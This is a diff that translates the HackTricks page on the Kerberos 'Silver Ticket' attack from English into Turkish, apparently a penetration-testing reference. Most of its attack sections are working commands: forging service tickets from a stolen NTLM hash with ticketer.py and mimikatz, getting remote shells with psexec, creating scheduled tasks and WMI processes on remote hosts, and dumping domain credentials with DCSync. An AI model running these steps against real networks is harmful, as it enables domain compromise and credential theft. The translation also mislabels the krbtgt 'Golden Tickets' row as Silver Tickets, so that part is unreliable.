@@ -1,41 +1,36 @@
-# Silver Ticket
+# Gümüş Bilet
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.
 
 </details>
 
 <img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+Eğer **hacking kariyeri** ilginizi çekiyorsa ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı polonyaca yazılı ve konuşulan gereklidir_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
-## Silver ticket
+## Gümüş bilet
 
-The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
+**Gümüş Bilet** saldırısı, Active Directory (AD) ortamlarında hizmet biletlerinin sömürülmesini içerir. Bu yöntem, genellikle yönetici ayrıcalıklarını hedefleyerek, ağdaki belirli hizmetlere **herhangi bir kullanıcıyı taklit ederek** erişebilmek için bir bilgisayar hesabı gibi bir hizmet hesabının NTLM karmasının elde edilmesine dayanır. Sahte bilet ile saldırgan, ağdaki belirli hizmetlere erişebilir. Bilet oluşturmak için, işletim sistemine bağlı olarak farklı araçlar kullanılır:
 
-For ticket crafting, different tools are employed based on the operating system:
-
-### On Linux
-
+### Linux üzerinde
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
-export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache 
+export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-
-### On Windows
-
+### Windows Üzerinde
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -47,56 +42,52 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+CIFS hizmeti, kurbanın dosya sistemine erişmek için yaygın bir hedef olarak belirtilir, ancak HOST ve RPCSS gibi diğer hizmetler de görevler ve WMI sorguları için istismar edilebilir.
 
-The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
+## Kullanılabilir Hizmetler
 
-## Available Services
-
-| Service Type                               | Service Silver Tickets                                                     |
+| Hizmet Türü                               | Hizmet Gümüş Biletleri                                                    |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
-| Scheduled Tasks                            | HOST                                                                       |
-| Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | LDAP                                                                       |
-| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Golden Tickets                             | krbtgt                                                                     |
+| PowerShell Uzak Yönetimi                        | <p>HOST</p><p>HTTP</p><p>İşletim sistemine bağlı olarak:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Bazı durumlarda sadece şunu isteyebilirsiniz: WINRM</p> |
+| Zamanlanmış Görevler                            | HOST                                                                       |
+| Windows Dosya Paylaşımı, ayrıca psexec            | CIFS                                                                       |
+| LDAP işlemleri, DCSync dahil           | LDAP                                                                       |
+| Windows Uzak Sunucu Yönetim Araçları | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
+| Gümüş Biletler                             | krbtgt                                                                     |
 
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+**Rubeus** kullanarak bu biletleri aşağıdaki parametre kullanılarak **tümünü isteyebilirsiniz**:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Event IDs
+### Gümüş biletler Olay Kimlikleri
 
-* 4624: Account Logon
-* 4634: Account Logoff
-* 4672: Admin Logon
+* 4624: Hesap Oturumu
+* 4634: Hesap Oturumu Kapatma
+* 4672: Yönetici Oturumu
 
-## Abusing Service tickets
+## Hizmet biletlerinin kötüye kullanılması
 
-In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
+Aşağıdaki örneklerde, biletin yönetici hesabını taklit ederek alındığını varsayalım.
 
 ### CIFS
 
-With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
-
+Bu bilet ile **SMB** üzerinden `C$` ve `ADMIN$` klasörüne erişebilir ve uzak dosya sistemine dosya kopyalayabilirsiniz, sadece şuna benzer bir işlem yapmanız yeterlidir:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-
-You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
+Ayrıca, **psexec** kullanarak ana bilgisayarda bir kabuk elde edebilir veya keyfi komutlar çalıştırabilirsiniz:
 
 {% content-ref url="../ntlm/psexec-and-winexec.md" %}
 [psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
 {% endcontent-ref %}
 
-### HOST
+### ANA BİLGİSAYAR
 
-With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:
-
+Bu izinle, uzaktaki bilgisayarlarda zamanlanmış görevler oluşturabilir ve keyfi komutlar çalıştırabilirsiniz:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -108,11 +99,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-
 ### HOST + RPCSS
 
-With these tickets you can **execute WMI in the victim system**:
-
+Bu biletlerle, hedef sisteminde WMI'ı **yürütebilirsiniz**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -122,8 +111,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-
-Find **more information about wmiexec** in the following page:
+Aşağıdaki sayfada **wmiexec hakkında daha fazla bilgi** bulabilirsiniz:
 
 {% content-ref url="../ntlm/wmicexec.md" %}
 [wmicexec.md](../ntlm/wmicexec.md)
@@ -131,33 +119,29 @@ Find **more information about wmiexec** in the following page:
 
 ### HOST + WSMAN (WINRM)
 
-With winrm access over a computer you can **access it** and even get a PowerShell:
-
+Bir bilgisayara winrm erişimi ile **erişebilirsiniz** ve hatta bir PowerShell alabilirsiniz:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-
-Check the following page to learn **more ways to connect with a remote host using winrm**:
+Aşağıdaki sayfayı kontrol edin, uzak bir ana bilgisayara winrm kullanarak bağlanmanın daha fazla yolunu öğrenmek için:
 
 {% content-ref url="../ntlm/winrm.md" %}
 [winrm.md](../ntlm/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
-Note that **winrm must be active and listening** on the remote computer to access it.
+Uzaktaki bilgisayara erişmek için **winrm aktif ve dinleme modunda** olmalıdır.
 {% endhint %}
 
 ### LDAP
 
-With this privilege you can dump the DC database using **DCSync**:
-
+Bu yetkiyle, **DCSync** kullanarak DC veritabanını dökümleyebilirsiniz:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+DCSync hakkında daha fazla bilgi edinin aşağıdaki sayfada:
 
-**Learn more about DCSync** in the following page:
-
-## References
+## Referanslar
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 * [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
@@ -167,20 +151,20 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 
 <img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı polonyaca yazılı ve konuşma becerisi gereklidir_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacking'i sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
+* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github reposuna **PR göndererek paylaşın**.
 
 </details>
